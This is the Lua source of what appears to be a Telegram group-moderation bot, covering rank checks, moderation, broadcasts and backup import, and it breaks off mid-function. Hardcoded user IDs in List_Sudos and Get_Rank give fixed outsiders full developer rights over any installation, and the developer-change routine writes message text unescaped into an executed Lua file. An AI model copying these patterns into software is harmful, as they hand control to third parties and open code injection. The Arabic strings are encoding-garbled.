--[[

--]]
database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./File_Libs/serpent.lua")
JSON    = dofile("./File_Libs/dkjson.lua")
json    = dofile("./File_Libs/JSON.lua")
URL     = dofile("./File_Libs/url.lua")
http    = require("socket.http")
https   = require("ssl.https")
sudos   = dofile("sudo.lua")
bot_id  = token:match("(%d+)")  
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1614314857,1398830949,1717439120}
print([[
#  _____  ________      ______  _____  
#  |  __ \|  ____\ \    / / __ \|  __ \ 
#  | |__) | |__   \ \  / / |  | | |__) |
#  |  _  /|  __|   \ \/ /| |  | |  _  / 
#  | | \ \| |____   \  / | |__| | | \ \ 
#  |_|  \_\______|   \/   \____/|_|  \_\

# ππππΎπππ π½ππ ππ πππππΎπ πππππ @REVORB0T
# πππππΎπ π½π πππππΎ @U660P
---------------------------------------------------------------------

]])
print("\27[34m"..[[

# ππππΎπππ π½ππ ππ πππππΎπ πππππ @REVORB0T
# πππππΎπ π½π πππππΎ @U660P
]].."\27[m")

io.popen("mkdir -p Tshake_Files")
t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
i = 0
for v in io.popen('ls Tshake_Files'):lines() do
if v:match(".lua$") then
i = i + 1
t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
end
end
print(t)
function vardump(value)  
print(serpent.block(value, {comment=false}))   
end 
function dl_cb(t,s)
end
function DevTshake(msg)  
local Taha_Sudo = false  
for k,v in pairs(List_Sudos) do  
if msg.sender_user_id_ == v then  
Taha_Sudo = true  
end  
end  
return Taha_Sudo  
end 
function DevTshakee(user)  
local Taha_Sudo = false  
for k,v in pairs(List_Sudos) do  
if user == v then  
Taha_Sudo = true  
end  
end  
return Taha_Sudo  
end 
function DevBot(msg) 
local hash = database:sismember(bot_id.."Tshake:Sudo:User", msg.sender_user_id_) 
if hash or DevTshake(msg) then  
return true  
else  
return false  
end  
end
function Constructoryyu(msg)
local hash = database:sismember(bot_id.."Tshake:Basic:Constructor23"..msg.chat_id_, msg.sender_user_id_) 
if hash or DevTshake(msg) or DevBot(msg) then    
return true    
else    
return false    
end 
end

function BasicConstructor(msg)
local hash = database:sismember(bot_id.."Tshake:Basic:Constructor"..msg.chat_id_, msg.sender_user_id_) 
if hash or DevTshake(msg) or DevBot(msg) or Constructoryyu(msg) then 
return true 
else 
return false 
end 
end

function Constructor(msg)
local hash = database:sismember(bot_id.."Tshake:Constructor"..msg.chat_id_, msg.sender_user_id_) 
if hash or DevTshake(msg) or DevBot(msg) or Constructoryyu(msg) or  BasicConstructor(msg) then    
return true    
else    
return false    
end 
end
function Owner(msg)
local hash = database:sismember(bot_id.."Tshake:Manager"..msg.chat_id_,msg.sender_user_id_)    
if hash or DevTshake(msg) or DevBot(msg) or Constructoryyu(msg) or BasicConstructor(msg) or Constructor(msg) then    
return true    
else    
return false    
end 
end
function Addictive(msg)
local hash = database:sismember(bot_id.."Tshake:Mod:User"..msg.chat_id_,msg.sender_user_id_)    
if hash or DevTshake(msg) or DevBot(msg) or Constructoryyu(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) then    
return true    
else    
return false    
end 
end
function Vips(msg)
local hash = database:sismember(bot_id.."Tshake:Special:User"..msg.chat_id_,msg.sender_user_id_) 
if hash or DevTshake(msg) or DevBot(msg) or Constructoryyu(msg) or BasicConstructor(msg) or Constructor(msg) or Owner(msg) or Addictive(msg) then    
return true 
else 
return false 
end 
end

function Rank_Checking(user_id,chat_id)
if tonumber(user_id) == tonumber(Id_Sudo) then
var = true  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = true  
elseif database:sismember(bot_id.."Tshake:Sudo:User", user_id) then
var = true  
elseif database:sismember(bot_id.."Tshake:Basic:Constructor"..chat_id, user_id) then
var = true
elseif database:sismember(bot_id.."Tshake:Constructor"..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id.."Tshake:Manager"..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id.."Tshake:Mod:User"..chat_id, user_id) then
var = true  
elseif database:sismember(bot_id.."Tshake:Special:User"..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end 
function Get_Rank(user_id,chat_id)
if tonumber(user_id) == tonumber(1398830949) then  
var = "ΩΨ¨Ψ±ΩΨ¬ Ψ§ΩΨ³ΩΨ±Ψ³"
elseif tonumber(user_id) == tonumber(1614314857) then  
var = "ΩΨ¨Ψ±ΩΨ¬ Ψ§ΩΨ³ΩΨ±Ψ³"
elseif tonumber(user_id) == tonumber(1748966653) then  
var = "ΩΨ·ΩΨ± Ψ§ΩΨ³ΩΨ±Ψ³"
elseif tonumber(user_id) == tonumber(1717439120) then  
var = "ΩΨ§ΩΩ Ψ§ΩΨ³ΩΨ±Ψ³"
elseif DevTshakee(user_id) == true then
var = "Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω"  
elseif tonumber(user_id) == tonumber(bot_id) then  
var = "Ψ§ΩΨ¨ΩΨͺ"
elseif database:sismember(bot_id.."Tshake:Sudo:User", user_id) then
var = database:get(bot_id.."Tshake:Sudo:Rd"..chat_id) or "Ψ§ΩΩΨ·ΩΨ±"  
elseif database:sismember(bot_id.."Tshake:Basic:Constructor23"..chat_id, user_id) then
var = "Ψ§ΩΩΨ§ΩΩ"
elseif database:sismember(bot_id.."Tshake:Basic:Constructor"..chat_id, user_id) then
var = database:get(bot_id.."Tshake:BasicConstructor:Rd"..chat_id) or "Ψ§ΩΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω"
elseif database:sismember(bot_id.."Tshake:Constructor"..chat_id, user_id) then
var = database:get(bot_id.."Tshake:Constructor:Rd"..chat_id) or "Ψ§ΩΩΩΨ΄Ψ¦"  
elseif database:sismember(bot_id.."Tshake:Manager"..chat_id, user_id) then
var = database:get(bot_id.."Tshake:Manager:Rd"..chat_id) or "Ψ§ΩΩΨ―ΩΨ±"  
elseif database:sismember(bot_id.."Tshake:Mod:User"..chat_id, user_id) then
var = database:get(bot_id.."Tshake:Mod:Rd"..chat_id) or "Ψ§ΩΨ§Ψ―ΩΩ"  
elseif database:sismember(bot_id.."Tshake:Special:User"..chat_id, user_id) then  
var = database:get(bot_id.."Tshake:Special:Rd"..chat_id) or "Ψ§ΩΩΩΩΨ²"  
else  
var = database:get(bot_id.."Tshake:Memp:Rd"..chat_id) or "Ψ§ΩΨΉΨΆΩ"
end  
return var
end 
function ChekAdd(chat_id)
if database:sismember(bot_id.."Tshake:Chek:Groups",chat_id) then
var = true
else 
var = false
end
return var
end
function Muted_Groups(Chat_id,User_id) 
if database:sismember(bot_id.."Tshake:Muted:User"..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end
function Ban_Groups(Chat_id,User_id) 
if database:sismember(bot_id.."Tshake:Ban:User"..Chat_id,User_id) then
Var = true
else
Var = false
end
return Var
end 
function Ban_All_Groups(User_id) 
if database:sismember(bot_id.."Tshake:GBan:User",User_id) then
Var = true
else
Var = false
end
return Var
end
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil)
end
function DeleteMessage(chat,id)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil)
end
function DeleteMessage_(chat,id,func)
tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},func or dl_cb,nil)
end
function getInputFile(file) 
if file:match("/") then 
infile = {ID = "InputFileLocal", 
path_ = file} 
elseif file:match("^%d+$") then 
infile = {ID = "InputFileId", 
id_ = file} 
else infile = {ID = "InputFilePersistentId", 
persistent_id_ = file} 
end 
return infile 
end
function RestrictChat(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end

function sendin(chat,msgid,user,user_id)
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. chat ..'&user_id='.. user_id)
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
info = 'β' 
infoo = 'false' 
else 
info = 'β' 
infoo = 'true' 
end
if Json_Info.result.can_delete_messages == true then
delete = 'β' 
deletee = 'false' 
else 
delete = 'β' 
deletee = 'true' 
end
if Json_Info.result.can_invite_users == true then
invite = 'β' 
invitee = 'false' 
else 
invite = 'β' 
invitee = 'true' 
end
if Json_Info.result.can_pin_messages == true then
pin = 'β' 
pinn = 'false' 
else 
pin = 'β' 
pinn = 'true' 
end
if Json_Info.result.can_restrict_members == true then
restrict = 'β' 
restrictt = 'false' 
else 
restrict = 'β' 
restrictt = 'true' 
end
if Json_Info.result.can_promote_members == true then
promote = 'β' 
promotee = 'false' 
else 
promote = 'β' 
promotee = 'true' 
end 
if Json_Info.result.can_manage_voice_chats == true then
voice = 'β' 
voicee = 'false' 
else 
voice = 'β' 
voicee = 'true' 
end
if Json_Info.result.can_manage_chat == true then
manage = 'β' 
managee = 'false' 
else 
manage = 'β' 
managee = 'true' 
end

keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΊΩΩΨ± Ψ§ΩΩΨΉΩΩΩΨ§Ψͺ '..info, callback_data='amr@'..user..'/user@'..user_id.."/chenginfo"..infoo},
},
{
{text = 'Ψ­Ψ°Ω Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω '..delete, callback_data='amr@'..user..'/user@'..user_id.."/delmsgg"..deletee},
},
{
{text = 'Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ '..restrict, callback_data='amr@'..user..'/user@'..user_id.."/banuser"..restrictt},
},
{
{text = 'Ψ§ΨΆΨ§ΩΩ ΩΨ³ΨͺΨ?Ψ―ΩΩΩ '..invite, callback_data='amr@'..user..'/user@'..user_id.."/addlink"..invitee},
},
{
{text = 'ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§Ψ¦Ω '..pin, callback_data='amr@'..user..'/user@'..user_id.."/pinmsg"..pinn},
},
{
{text = 'Ψ§Ψ―Ψ§Ψ±Ω Ψ§ΩΩΩΨ§ΩΩΨ§Ψͺ '..voice, callback_data='amr@'..user..'/user@'..user_id.."/voice"..voicee},
},
{
{text = 'Ψ§ΩΨ¨ΩΨ§Ψ‘ ΩΨͺΨ?ΩΩ '..manage, callback_data='amr@'..user..'/user@'..user_id.."/manage"..managee},
},
{
{text = 'Ψ§ΨΆΨ§ΩΩ ΩΨ΄Ψ±ΩΩΩ '..promote, callback_data='amr@'..user..'/user@'..user_id.."/addadmin"..promotee},
},
}
local Texti = 'ΨͺΩ ΨͺΨΉΨ―ΩΩ Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ'
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..chat..'&text='..URL.escape(Texti)..'&message_id='..msgid..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end



function s_api(web) 
local info, res = https.request(web) 
local req = json:decode(info) 
if res ~= 200 then 
return false 
end 
if not req.ok then 
return false end 
return req 
end 
function sendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..token 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
return s_api(url)  
end
function send_inline_key(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return s_api(send_api) 
end
function getbio(User)
local var = "ΩΨ§ΩΩΨ¬Ψ―"
local url , res = https.request("https://api.telegram.org/bot"..token.."/getchat?chat_id="..User)
data = json:decode(url)
if data.result.bio then
var = data.result.bio
end
return var
end
function send_inline_Media(chat_id,iny,x,cx,inline,reply_id) 
local keyboard = {} 
keyboard.inline_keyboard = inline 
local send_api = "https://api.telegram.org/bot"..token.."/"..iny.."?chat_id="..chat_id.."&"..x.."="..cx.."&reply_markup="..URL.escape(JSON.encode(keyboard)) 
if reply_id then 
local msg_id = reply_id/2097152/0.5
send_api = send_api.."&reply_to_message_id="..msg_id 
end 
return s_api(send_api) 
end
function GetInputFile(file)  
local file = file or ""   
if file:match("/") then  
infile = {ID= "InputFileLocal", path_  = file}  
elseif file:match("^%d+$") then  
infile ={ID="InputFileId",id_=file}  
else infile={ID="InputFilePersistentId",persistent_id_ = file}  
end 
return infile 
end
function sendPhoto(chat_id,reply_id,photo,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessagePhoto",
photo_ = GetInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption or ""
}
},func or dl_cb,nil)
end
	
function sendVoice(chat_id,reply_id,voice,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVoice",
voice_ = GetInputFile(voice),
duration_ = "",
waveform_ = "",
caption_ = caption or ""
}},func or dl_cb,nil)
end

function sendAnimation(chat_id,reply_id,animation,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAnimation",
animation_ = GetInputFile(animation),
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil)
end

function sendAudio(chat_id,reply_id,audio,title,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAudio",
audio_ = GetInputFile(audio),
duration_ = "",
title_ = title or "",
performer_ = "",
caption_ = caption or ""
}},func or dl_cb,nil)
end

function sendSticker(chat_id,reply_id,sticker,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageSticker",
sticker_ = GetInputFile(sticker),
width_ = 0,
height_ = 0
}},func or dl_cb,nil)
end

function sendVideo(chat_id,reply_id,video,caption,func)
tdcli_function({ 
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 0,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVideo",  
video_ = GetInputFile(video),
added_sticker_file_ids_ = {},
duration_ = 0,
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil)
end


function sendDocument(chat_id,reply_id,document,caption,func)
tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageDocument",
document_ = GetInputFile(document),
caption_ = caption
}},func or dl_cb,nil)
end
function Kick_Group(chat,user)
tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil)
end

function Reply_Status(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "DDDDiD")
for Tshake in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = Tshake
end
local NameUser = "ββΏΨ¨ΩΨ§Ψ³Ψ·Ω - ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "ββΏΨ§ΩΨΉΨΆΩ ~ ["..data.first_name_.."](T.me/"..UserName..")"
if status == "lock" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\nπ«βΏΨ?Ψ§Ψ΅ΩΨ© - Ψ§ΩΩΨ³Ψ­\n")
return false
end
if status == "lockktm" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\nπ«βΏΨ?Ψ§Ψ΅ΩΨ© - Ψ§ΩΩΨͺΩ\n")
return false
end
if status == "lockkick" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\nπ«βΏΨ?Ψ§Ψ΅ΩΨ© - Ψ§ΩΨ·Ψ±Ψ―\n")
return false
end
if status == "lockkid" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text.."\nπ«βΏΨ?Ψ§Ψ΅ΩΨ© - Ψ§ΩΨͺΩΩΩΨ―\n")
return false
end
if status == "unlock" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text)
return false
end
if status == "reply" then
send(msg.chat_id_, msg.id_,NameUserr.."\n"..text)
return false
end
if status == "reply_Add" then
send(msg.chat_id_, msg.id_,NameUser.."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"π€βΏ Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω")
end
end,nil)   
end -- end
function Total_message(msgs)  
local message = ''  
if tonumber(msgs) < 100 then 
message = 'ΨΊΩΨ± ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 200 then 
message = 'Ψ¨Ψ―Ω ΩΨͺΨ­Ψ³Ω' 
elseif tonumber(msgs) < 400 then 
message = 'Ψ΄Ψ¨Ω ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 700 then 
message = 'ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 1200 then 
message = 'ΩΨͺΩΨ§ΨΉΩ ΩΩΩ' 
elseif tonumber(msgs) < 2000 then 
message = 'ΩΨͺΩΨ§ΨΉΩ Ψ¬Ψ―Ψ§' 
elseif tonumber(msgs) < 3500 then 
message = 'Ψ§ΩΩΩ ΨͺΩΨ§ΨΉΩ'  
elseif tonumber(msgs) < 4000 then 
message = 'ΩΨͺΩΨ§ΨΉΩ ΩΨ§Ψ±' 
elseif tonumber(msgs) < 4500 then 
message = 'ΩΩΨ© Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 5500 then 
message = 'Ψ§ΩΩΩ ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 7000 then 
message = 'ΩΩΩ Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 9500 then 
message = 'Ψ§ΩΨ¨Ψ±ΩΨ·ΩΨ± Ψ§ΩΨͺΩΨ§ΨΉΩ' 
elseif tonumber(msgs) < 10000000000 then 
message = 'Ψ±Ψ¨ Ψ§ΩΨͺΩΨ§ΨΉΩ'  
end 
return message 
end
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
function add_file(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
sendtext(chat,msg.id_,"π¨βΏΩΩΩ Ψ§ΩΩΨ³Ψ?Ω Ψ§ΩΨ§Ψ­ΨͺΩΨ§Ψ·ΩΩ ΩΩΨ³ ΩΩΨ§Ψ°Ψ§ Ψ§ΩΨ¨ΩΨͺ")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot' .. token .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_,"β»βΏΨ¬Ψ§Ψ±Ω ...\nπ βΏΨ±ΩΨΉ Ψ§ΩΩΩΩ Ψ§ΩΨ§Ω")   
else
sendtext(chat,msg.id_,"*π?βΏΨΉΨ°Ψ±Ψ§ Ψ§ΩΩΩΩ ΩΩΨ³ Ψ¨Ψ΅ΩΨΊΨ© {JSON} ΩΨ±Ψ¬Ω Ψ±ΩΨΉ Ψ§ΩΩΩΩ Ψ§ΩΨ΅Ψ­ΩΨ­*")   
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
vardump(groups)  
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Tshake:Chek:Groups',idg) 
database:set(bot_id.."Tshake:Lock:tagservrbot"..idg,true)   
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..'Tshake:'..lock..idg,"del")    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id.."Tshake:Constructor"..idg,idmsh)
end;end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id.."Tshake:Manager"..idg,idmder)  
end;end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id.."Tshake:Mod:User"..idg,idmod)  
end;end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id.."Tshake:Basic:Constructor"..idg,idASAS)  
end;end
if v.linkgroup then
if v.linkgroup ~= "" then
database:set(bot_id.."Tshake:Private:Group:Link"..idg,v.linkgroup)   
end;end;end
send(chat,msg.id_,"π‘βΏΨͺΩ Ψ±ΩΨΉ Ψ§ΩΩΩΩ Ψ¨ΩΨ¬Ψ§Ψ­ ΩΨͺΩΨΉΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ\nπβΏΩΨ±ΩΨΉ {Ψ§ΩΨ§ΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ ; ΩΨ§ΩΩΩΨ΄Ψ¦ΩΩ ; ΩΨ§ΩΩΨ―Ψ±Ψ§Ψ‘; ΩΨ§ΩΨ§Ψ―ΩΩΩΩ} Ψ¨ΩΨ¬Ψ§Ψ­")   
end

function Is_Not_Spam(msg,type)
if type == "kick" then 
Reply_Status(msg,msg.sender_user_id_,"reply","πβΏΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± ΩΩΨ§ ΩΨͺΩ Ψ·Ψ±Ψ―Ω")  
Kick_Group(msg.chat_id_,msg.sender_user_id_) 
return false  
end 
if type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
return false
end 
if type == "keed" then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_) 
Reply_Status(msg,msg.sender_user_id_,"reply","πβΏΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± ΩΩΨ§ ΩΨͺΩ ΨͺΩΩΩΨ―Ω")  
return false  
end  
if type == "mute" then
Reply_Status(msg,msg.sender_user_id_,"reply","πβΏΩΨ§Ω Ψ¨Ψ§ΩΨͺΩΨ±Ψ§Ψ± ΩΩΨ§ ΩΨͺΩ ΩΨͺΩΩ")  
database:sadd(bot_id.."Tshake:Muted:User"..msg.chat_id_,msg.sender_user_id_) 
return false  
end
end  
function Tshake_Files(msg)
for v in io.popen('ls Tshake_Files'):lines() do
if v:match(".lua$") then
plugin = dofile("Tshake_Files/"..v)
if plugin.Tshake and msg then
pre_msg = plugin.Tshake(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end
function Tshake_Started_Bot(msg,data) -- Ψ¨Ψ―Ψ§ΩΨ© Ψ§ΩΨΉΩΩ
if msg then
local msg = data.message_
local text = msg.content_.text_
if msg.sender_user_id_ == tonumber(bot_id) then return false end
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'Tshake:UsersBot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end

if text and text:match("@[%a%d_]+") and  msg.sender_user_id_ == tonumber(Id_Sudo) and database:get(bot_id..":usernewsudo:"..msg.sender_user_id_) then 
function Function_Tshake(arg, data)
msg = arg.msg
if data.id_ then
if (data and data.type_ and data.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"πβΏ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !")   
return false 
end
idmsgq = database:get(bot_id..":usernewsudo:"..msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = idmsgq}) 
local Tshake_Info_Sudo = io.open("sudo.lua", 'w')
Tshake_Info_Sudo:write([[
token = "]]..token..[["

Sudo = ]]..data.id_..[[  

UserName = "]]..msg.content_.text_..[[" ;
]])
Tshake_Info_Sudo:close()
send(msg.chat_id_,msg.id_,"π§βΏ ΨͺΩ ΨͺΨΊΩΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΨ¨ΩΨͺ Ψ¨ΩΨ¬Ψ§Ψ­ .")
database:del(bot_id..":usernewsudo:"..msg.sender_user_id_)
dofile('Tshake.lua')  
else
send(msg.chat_id_, msg.id_,"πβΏ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text},Function_Tshake,{msg=msg})



return false
end

if text == "ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω" and  msg.sender_user_id_ == tonumber(Id_Sudo) then 
local Text = "π§ βΏΨ³ΩΩ ΩΨͺΩ ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω\nβοΈ βΏΩΩ  Ψ§ΩΨͺ  ΩΨͺΨ£ΩΨ― ΩΩ ΩΨ°Ψ§ Ψ§ΩΨͺΨΊΩΨ± Ψ"
keyboard = {} 
keyboard.inline_keyboard = {{{text = 'ΩΨΉΩ', callback_data=msg.sender_user_id_.."/yesS"},{text = 'ΩΩΨ§ , Ψ§ΩΨΊΨ§Ψ‘', callback_data=msg.sender_user_id_.."/noS"}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end

if database:get(bot_id.."Tshake:Tshake:Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" or text == "Ψ§ΩΨΊΨ§Ψ‘ β" then   
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
database:del(bot_id.."Tshake:Tshake:Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Tshake:Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Tshake:Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
